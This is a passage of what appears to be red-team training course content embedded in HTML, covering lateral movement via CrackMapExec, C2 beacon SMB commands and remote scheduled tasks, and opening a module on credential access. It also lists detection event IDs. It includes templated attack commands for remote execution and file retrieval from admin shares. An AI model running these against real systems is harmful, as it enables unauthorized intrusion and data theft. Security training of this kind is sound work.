&quot;whoami&quot;\n</code></pre>\n<p><em>Explanation:</em> <code>-x</code> tells <code>cme</code> to execute the command. By default, it often tries <code>wmiexec</code> first, then <code>smbexec</code>. These techniques use WMI or SMB/IPC$ to achieve remote code execution.</p>\n</li>\n</ol>\n<p><strong>Step-by-Step (Using a C2 Framework - Generic Example):</strong></p>\n<p>C2s have commands that leverage SMB, either directly for file operations or as the transport for other techniques like PsExec or its own SMB-based lateral movement modules (<code>smbexec</code>, <code>jump smb</code>).</p>\n<ol>\n<li><strong>Access Remote File Share:</strong><pre><code class=\"language-c2\">beacon&gt; remote_file_browse \\\\&lt;target_host_ip_or_name&gt;\\c$\nbeacon&gt; remote_file_get \\\\&lt;target_host_ip_or_name&gt;\\c$\\users\\public\\sensitive.txt\n</code></pre>\n</li>\n<li><strong>Use SMBExec (if available):</strong><pre><code class=\"language-c2\">beacon&gt; smbexec &lt;target_host_ip_or_name&gt; &lt;listener_name&gt;\n</code></pre>\n</li>\n</ol>\n<h4>2.2.5 Scheduled Tasks</h4>\n<ul>\n<li><strong>Concept:</strong> Windows Task Scheduler allows users to schedule programs or scripts to run at specific times or in response to specific events. Tasks can be created and managed remotely.</li>\n<li><strong>How Attackers Use It:</strong> Attackers can create immediate or time-delayed tasks on remote machines to execute payloads, establish persistence (Module 5), or run reconnaissance scripts.</li>\n<li><strong>Why it&#39;s Useful:</strong> Built-in, can be scheduled for future execution (evasion), can run as SYSTEM or other users, often less scrutinized for remote task creation than other methods.</li>\n<li><strong>OpSec Considerations:</strong><ul>\n<li>Creates a scheduled task entry on the target (visible in Task Scheduler GUI and command line).</li>\n<li>Generates network traffic related to the Task Scheduler service.</li>\n<li>Task creation is logged (Event ID 4698).</li>\n</ul>\n</li>\n<li><strong>Detection:</strong><ul>\n<li><strong>Event Logs:</strong> Event ID 4698 (A scheduled task was created), 4702 (A scheduled task was updated), 4688 (Process Creation - for the command executed by the task).</li>\n<li><strong>Task Scheduler:</strong> Manual inspection of scheduled tasks.</li>\n<li><strong>Tools:</strong> PowerShell (<code>Get-ScheduledTask</code>), <code>schtasks /query</code>.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Step-by-Step (Using Command Line):</strong></p>\n<ol>\n<li><strong>Create a Task:</strong><pre><code class=\"language-bash\">schtasks /create /s &lt;target_host_ip_or_name&gt; /\n</code></pre>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, let&#39;s dive deep into Module 3: Large-Scale Credential Access and Data Decryption! This is where we turn initial footholds and lateral movement capabilities into keys that unlock more and more of the network. Think of credentials as the primary currency in Active Directory environments. Mastering their collection and exploitation is fundamental to advanced red teaming.</p>\n<p>As your guide, I&#39;m thrilled to share these powerful techniques with you. Remember, with great power comes great responsibility – these methods are for authorized testing only!</p>\n<hr>\n<h2>Module 3: Large-Scale Credential Access and Data Decryption - Deep Dive</h2>\n<p><strong>Module Objective:</strong> By the end of this module, you will not only understand <em>how</em> various credential access techniques work but also develop the strategic mindset to apply them efficiently and at scale across a compromised Active Directory environment. You&#39;ll learn to target high-value assets, extract various credential types, decrypt sensitive data, and understand the defensive challenges, effectively becoming proficient in this critical phase of a red team operation.</p>\n<hr>\n<h3>Introduction: The Value of Credentials</h3>\n<p>Welcome back! In Module 1, we established our initial post-exploitation presence and performed initial reconnaissance. In Module 2, we learned how to move laterally between systems and leverage trust relationships. Now, we focus on arguably the most impactful activity post-initial access: <strong>Credential Access</strong>.</p>\n<p>Why is credential access so vital?</p>\n<ol>\n<li><strong>Keys to the Kingdom:</strong> Credentials (passwords, hashes, Kerberos tickets) grant access to resources, systems, a
